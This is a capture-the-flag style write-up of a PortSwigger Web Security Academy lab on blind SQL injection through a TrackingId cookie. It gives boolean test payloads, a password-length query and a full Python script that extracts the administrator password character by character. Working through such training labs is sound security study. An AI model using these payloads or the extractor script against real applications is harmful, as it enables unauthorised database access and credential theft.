# Lab: Blind SQL injection with conditional responses

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  

## 🎯 Objective
The application contains a blind SQL injection vulnerability in the `TrackingId` cookie. The results of the query are not returned, but the application displays a "Welcome back" message if the query evaluates to true. The goal is to exploit this conditional response to extract the `administrator` password and log in.

## 🕵️‍♂️ Analysis
Because the application does not return any database output or error messages, we cannot use a standard `UNION` attack. However, the presence or absence of the "Welcome back" message acts as a boolean indicator (True/False). 

By appending logical operators (`AND`) to a valid tracking cookie, we can ask the database questions. If the statement we inject is True, the query returns rows, and the message appears. If False, the message disappears. 
* **True Condition Test:** `TrackingId=yourID' AND '1'='1` (Displays "Welcome back")
* **False Condition Test:** `TrackingId=yourID' AND '1'='2` (Message disappears)

Using this oracle, we can determine the length of the administrator's password and extract it character by character using the `SUBSTRING()` function.

## 🚀 Payload & Execution

### Step 1: Determine Password Length
I verified the password length by injecting a payload that checks if the length equals a specific number. 
* **Payload:** `TrackingId=cSP0LHogRDUScWhr' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--`
* **Result:** The "Welcome back" message appeared, confirming the password is exactly 20 characters long.

### Step 2: Character Extraction via Custom Automation
To extract the password, I needed to test each position (1-20) against all possible lowercase alphanumeric characters. 
* **Extraction Payload Structure:** `TrackingId=cSP0LHogRDUScWhr' AND (SELECT SUBSTRING(password, §position§, 1) FROM users WHERE username='administrator')='§char§'--`

Because Burp Suite Community Edition heavily throttles Intruder attacks, brute-forcing 720 possible combinations would be highly inefficient. Instead, I wrote a custom Python script using the `requests` library to automate the extraction.

**Custom Python Extractor (`exploit.py`):**
```python
import requests
import sys

url = "https://[LAB_ID].web-security-academy.net/"
session_cookie = "[your_session_cookie]"
tracking_id = "[your_tracking_id]"
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("[*] Starting Blind SQLi Extraction...")

for position in range(1, 21):
    for char in charset:
        payload = f"{tracking_id}' AND (SELECT SUBSTRING(password, {position}, 1) FROM users WHERE username='administrator')='{char}'--"
        headers = {"Cookie": f"TrackingId={payload}; session={session_cookie}"}
        
        response = requests.get(url, headers=headers)
        
        if "Welcome back" in response.text:
            password += char
            sys.stdout.write(f"\r[*] Extracting Password: {password}")
            sys.stdout.flush()
            break 

print(f"\n\n[+] Extraction Complete!")
print(f"[+] Administrator Password: {password}")
```

### Step 3: Login
Result: The script successfully extracted the password: `radqiu0w5hfc41usc22e`. Logging in with these credentials solved the lab.
